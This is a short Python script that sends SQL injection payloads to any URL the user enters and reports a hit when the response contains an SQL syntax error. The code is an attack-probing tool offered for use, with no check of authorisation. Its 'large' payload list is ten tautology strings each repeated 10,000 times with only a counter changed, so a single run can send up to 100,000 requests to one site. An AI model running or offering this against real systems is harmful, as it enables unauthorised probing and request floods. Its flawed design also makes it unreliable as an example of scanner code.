import requests
import string

class SQLInjectionScanner:
    """
    A class that scans a web application for SQL injection vulnerabilities using a large payload list.
    """

    def __init__(self, target_url):
        """
        Initializes the SQLInjectionScanner class with the target URL.

        Args:
            target_url (str): The URL of the target web application.
        """
        self.target_url = target_url

    def detect_sql_injection(self):
        """
        Detects SQL injection vulnerabilities in the target web application using a large payload list.

        Returns:
            bool: True if SQL injection vulnerability is detected, False otherwise.
        """
        # Define a large payload list
        sql_injection_payloads = [
            f"' OR 1=1 -- {i}" for i in range(10000)
        ] + [
            f"' AND 1=1 -- {i}" for i in range(10000)
        ] + [
            f"' OR 1=2 -- {i}" for i in range(10000)
        ] + [
            f"' AND 1=2 -- {i}" for i in range(10000)
        ] + [
            f"' OR '1'='1' -- {i}" for i in range(10000)
        ] + [
            f"' AND '1'='1' -- {i}" for i in range(10000)
        ] + [
            f"' OR 1=3 -- {i}" for i in range(10000)
        ] + [
            f"' AND 1=3 -- {i}" for i in range(10000)
        ] + [
            f"' OR '1'='2' -- {i}" for i in range(10000)
        ] + [
            f"' AND '1'='2' -- {i}" for i in range(10000)
        ]

        # Iterate through the payloads and check for SQL injection
        for payload in sql_injection_payloads:
            url = self.target_url + payload
            response = requests.get(url)
            if "SQL syntax" in response.text or "error in your SQL syntax" in response.text:
                print(f"SQL injection vulnerability detected with payload: {payload}")
                return True

        return False

# Example usage
url = input("Enter URL with http:// : ")
scanner = SQLInjectionScanner(url)

# Detect SQL injection vulnerability
if scanner.detect_sql_injection():
    print("SQL injection vulnerability detected!")
else:
    print("No SQL injection vulnerability detected.")